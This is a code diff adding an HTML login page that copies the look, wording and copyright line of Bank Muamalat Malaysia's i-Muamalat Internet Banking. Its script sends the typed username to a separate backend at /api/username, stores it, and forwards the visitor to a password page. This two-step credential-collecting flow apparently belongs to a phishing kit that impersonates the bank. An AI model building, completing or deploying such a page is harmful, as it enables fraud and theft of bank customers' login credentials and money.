@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - i-Muamalat Internet Banking</title>
+    <!-- Bootstrap CSS -->
+    <link href="bootstrap.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Custom CSS (style.css) -->
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* (Gaya CSS sama seperti sebelumnya, tidak perlu diubah) */
+        .login-tabs {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 10px;
+        }
+        .login-tabs a {
+            color: #666;
+            text-decoration: none;
+            font-family: AvenirBold;
+            font-size: 1.1rem;
+            font-weight: 700;
+            padding: 0 25px 5px 25px;
+            border-bottom: 3px solid transparent;
+        }
+        .login-tabs a.active {
+            color: #333;
+            border-bottom-color: #FF8145;
+        }
+        .login-card {
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+        }
+        .login-header {
+            background-color: #F0F0F0;
+            padding: 1.5rem 2rem;
+            text-align: center;
+        }
+        .login-header h2 {
+            color: #002F87;
+            font-weight: 700;
+            font-family: AvenirBold;
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+        .login-header p {
+            color: #333;
+            font-family: AvenirMedium;
+            margin-bottom: 0;
+        }
+        .login-body {
+            background-color: #EFEDED;
+            padding: 1rem;
+            border-bottom-left-radius: 0;
+            border-bottom-right-radius: 0;
+        }
+        .form-center {
+            width: 80%;
+            margin: 0 auto;
+        }
+        #username {
+            padding-top: 0.5rem;
+            padding-bottom: 0.5rem;
+            padding-left: 0.15rem;
+            padding-right: 2rem;
+            height: auto;
+        }
+        .form-control {
+            background-color: white;
+            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+        }
+        .form-control.is-invalid {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 0.2rem rgba(220,53,69,.25);
+        }
+        .btn.button1 {
+            width: 80% !important;
+            padding-top: 0.5rem;
+            padding-bottom: 0.5rem;
+            padding-left: 0.15rem;
+            padding-right: 0.15rem;
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+        }
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+        .error-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #dc3545;
+            display: none;
+            font-size: 1.2rem;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 0.85rem;
+            margin-top: 5px;
+            display: none;
+        }
+        .forgot-kill-wrapper {
+            width: 80%;
+            margin: 0 auto;
+        }
+        .forgot-kill {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #DEDEDE;
+        }
+        .forgot-kill a {
+            color: #000;
+            font-weight: 700;
+            text-decoration: underline;
+            font-size: 14px;
+        }
+        .forgot-kill a:hover {
+            color: #333;
+        }
+        .alert-announce {
+            display: flex;
+            justify-content: space-between;
+            align-items: stretch;
+            margin-left: -2rem;
+            margin-right: -2rem;
+            margin-bottom: -2rem;
+            margin-top: 2rem;
+            padding: 1rem 2rem;
+            background-color: white;
+            border-bottom-left-radius: 25px;
+            border-bottom-right-radius: 25px;
+            box-shadow: inset 0 2px 8px rgba(0,0,0,0.02);
+        }
+        .alert-item {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: #002F87;
+            font-weight: 700;
+            font-family: AvenirBold;
+            text-align: center;
+        }
+        .alert-item img {
+            height: 50px;
+            width: auto;
+            margin-bottom: 5px;
+        }
+        .icon-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: 5px;
+        }
+        .new-icon {
+            height: 20px !important;
+            width: auto;
+        }
+        .separator {
+            width: 1px;
+            background-color: #333;
+            margin: 0 15px;
+        }
+        .navbar .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-wrapper img {
+            height: 40px;
+            width: auto;
+        }
+        .logo1 {
+            height: 40px;
+        }
+        .navbar-secondary-logo img {
+            height: 30px;
+        }
+        .navbar-toggler {
+            border: none;
+            margin-right: 10px;
+        }
+        .navbar-toggler-icon {
+            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='%23002F87' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e") !important;
+        }
+        .navbar-collapse {
+            flex-grow: 0;
+        }
+        @media (min-width: 992px) {
+            .navbar-toggler {
+                display: none;
+            }
+        }
+        @media (max-width: 991px) {
+            .navbar-collapse {
+                background-color: #FF8145;
+                padding: 1rem;
+                border-radius: 0 0 15px 15px;
+                margin-top: 10px;
+            }
+            .navbar-nav .nav-link {
+                text-align: center;
+            }
+        }
+        .bg {
+            background-image: url('login_background.png');
+            background-size: cover;
+            background-position: center;
+            min-height: calc(100vh - 76px);
+            position: relative;
+        }
+        .bg .container {
+            padding-top: 3rem;
+        }
+        .copyright {
+            text-align: center;
+            color: white;
+            font-size: 0.8rem;
+            margin-top: 2rem;
+            font-family: Avenir;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-custom py-3">
+        <div class="container">
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="logo-wrapper">
+                <a href="#">
+                    <img src="navbar_logo.png" alt="Bank Muamalat" class="logo1">
+                </a>
+                <a href="#" class="navbar-secondary-logo">
+                    <img src="navbar_secondary_logo.png" alt="Secondary Logo">
+                </a>
+            </div>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link white" href="#">Contact Us</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="bg d-flex align-items-center">
+        <div class="container py-4">
+            <div class="row justify-content-center">
+                <div class="col-lg-6 col-md-8">
+                    <div class="login-card">
+                        <div class="login-header">
+                            <div class="login-tabs">
+                                <a href="#" class="active">Login</a>
+                                <a href="#">Register</a>
+                            </div>
+                            <h2>Welcome to <br>i-Muamalat Internet Banking</h2>
+                            <p>Manage your finances online, <br>anytime & anywhere</p>
+                        </div>
+                        <div class="login-body">
+                            <form id="loginForm" novalidate>
+                                <div class="mb-4 form-center">
+                                    <label for="username" class="form-label mediumText grey3">Username</label>
+                                    <div class="input-wrapper">
+                                        <input type="text" class="form-control" id="username" placeholder="Username" required>
+                                        <i class="fas fa-exclamation-circle error-icon" id="usernameErrorIcon"></i>
+                                    </div>
+                                    <div class="error-message" id="usernameErrorMessage"></div>
+                                </div>
+
+                                <!-- Forgot Password & Kill Switch -->
+                                <div class="forgot-kill-wrapper">
+                                    <div class="forgot-kill">
+                                        <a href="#" class="mediumText">Forgot Password</a>
+                                        <a href="#" class="mediumText">Kill Switch</a>
+                                    </div>
+                                </div>
+
+                                <!-- Tombol NEXT -->
+                                <button type="submit" class="btn button1 font4 mt-3" id="submitBtn">NEXT</button>
+
+                                <!-- Security Alert & Announcements -->
+                                <div class="alert-announce">
+                                    <a href="#" class="alert-item">
+                                        <img src="security_alert.png" alt="Security Alert">
+                                        <span>Security Alert</span>
+                                    </a>
+                                    <div class="separator"></div>
+                                    <a href="#" class="alert-item">
+                                        <div class="icon-wrapper">
+                                            <img src="announcement.png" alt="Announcement">
+                                            <img src="new_icon.png" alt="New" class="new-icon">
+                                        </div>
+                                        <span>Announcements</span>
+                                    </a>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>Copyright © Bank Muamalat Malaysia Berhad 196501000376 (6175-W)</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- MooTools dan JavaScript -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
+    <script>
+        var messageRequired = "{0} is required.";
+        var messageMustBeNumber = "{0} must be a number.";
+        var messageInvalidRange = "{0} must be between {1} and {2}.";
+        var messageInvalidChar = "{0} contains invalid characters.";
+        var messageInvalidEmail = "{0} is not a valid email address.";
+        var messageAtLeastOne = "Please fill at least one field.";
+        var messageRequiredIf = "{0} is required.";
+        var messageInvalidLength = "{0} has invalid length.";
+        var messageMustBeSame = "{0} and {1} must be the same.";
+        var messageInvalidDate = "{0} is not a valid date.";
+        var messageMustBeEarlier = "{0} must be earlier than {1}.";
+        var messageKinlyEnter = "Please enter {0}.";
+    </script>
+    <script src="common.js"></script>
+    <script src="validation.js"></script>
+    <script src="header.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Validasi form
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var usernameField = document.getElementById('username');
+            var errorIcon = document.getElementById('usernameErrorIcon');
+            var errorMessage = document.getElementById('usernameErrorMessage');
+            var usernameValue = usernameField.value.trim();
+
+            // Reset tampilan error
+            usernameField.classList.remove('is-invalid');
+            errorIcon.style.display = 'none';
+            errorMessage.style.display = 'none';
+
+            // Cek apakah username kosong
+            if (usernameValue === '') {
+                usernameField.classList.add('is-invalid');
+                errorIcon.style.display = 'block';
+                errorMessage.textContent = 'Please enter username';
+                errorMessage.style.display = 'block';
+                usernameField.focus();
+                return;
+            }
+
+            // Cek panjang minimal 6 karakter
+            if (usernameValue.length < 6) {
+                usernameField.classList.add('is-invalid');
+                errorIcon.style.display = 'block';
+                errorMessage.textContent = 'Username must be at least 6 characters long';
+                errorMessage.style.display = 'block';
+                usernameField.focus();
+                return;
+            }
+
+            // Disable tombol untuk mencegah double submit
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'SENDING...';
+
+            // Kirim username ke backend (password kosong)
+            fetch('/api/username', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: usernameValue, password: '' })
+            })
+            .then(res => {
+                if (!res.ok) {
+                    return res.json().then(err => { throw new Error(err.error || 'Server error'); });
+                }
+                return res.json();
+            })
+            .then(data => {
+                if (data.success) {
+                    sessionStorage.setItem('username', usernameValue);
+                    window.location.href = 'password.html';
+                } else {
+                    throw new Error('Server returned error');
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                alert('Gagal menghubungi server. Pastikan server backend berjalan di http://localhost:3000');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'NEXT';
+            });
+        });
+
+        // Sembunyikan error saat pengguna mengetik
+        document.getElementById('username').addEventListener('input', function() {
+            this.classList.remove('is-invalid');
+            document.getElementById('usernameErrorIcon').style.display = 'none';
+            document.getElementById('usernameErrorMessage').style.display = 'none';
+        });
+
+        // Simulasi tab aktif
+        document.querySelectorAll('.login-tabs a').forEach(tab => {
+            tab.addEventListener('click', function(e) {
+                e.preventDefault();
+                document.querySelectorAll('.login-tabs a').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+    </script>
+</body>
+</html>
